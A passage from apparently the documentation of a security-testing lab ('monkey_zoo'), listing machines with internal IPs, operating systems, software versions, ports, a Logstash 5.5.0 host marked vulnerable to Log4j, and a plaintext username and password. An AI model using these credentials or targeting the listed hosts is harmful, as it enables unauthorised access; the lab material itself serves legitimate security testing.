<td>Java 1.8.0</td>
</tr>
<tr class="odd">
<td>Default server’s port:</td>
<td>9600</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>User: logstash</td>
<td></td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021488" class="anchor"></span>Nr. <strong>3-56 Log4j Logstash</strong></p>
<p>(10.2.3.56)</p></th>
<th>(Vulnerable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Windows Server 2016 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>Logstash 5.5.0</td>
<td>Java 1.8.0</td>
</tr>
<tr class="odd">
<td>Default server’s port:</td>
<td>9600</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>User: m0nk3y, Password: 7;@K"kPTM</td>
</tr>
</tbody>
</table>


<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021489" class="anchor"></span>Nr. <strong>250 MonkeyIsland</strong></p>
<p>(10.2.2.250)</p></th>
<th></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Ubuntu 16.04.05 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>MonkeyIsland server, git, mongodb etc.</td>
</tr>
<tr class="odd">
<td>Default server’s port:</td>
<td>22, 443</td>
</tr>
<tr class="even">
<td>Private key passphrase:</td>
<td>-</td>
</tr>
<tr class="odd">
<td>Notes:</td>
<td>Only accessible through GCP</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021490" class="anchor"></span>Nr. <strong>251 MonkeyIsland</strong></p>
<p>(10.2.2.251)</p></th>
<th></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Windows Server 2016 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>MonkeyIsland server, git, mongodb etc.</td>
</tr>
<tr class="odd">
<td>Default server’s port:</td>
<td>3389, 443</td>
</tr>
<tr class="even">
<td>Private key passphrase:</td>
<td>-</td>
</tr>
<tr class="odd">
<td>Notes:</td>
<td>Only accessible through GCP</td>
</tr>
</tbody>
</table>

# Network topography:

<img src="/envs/monkey_zoo/docs/images/networkTopography.jpg" >
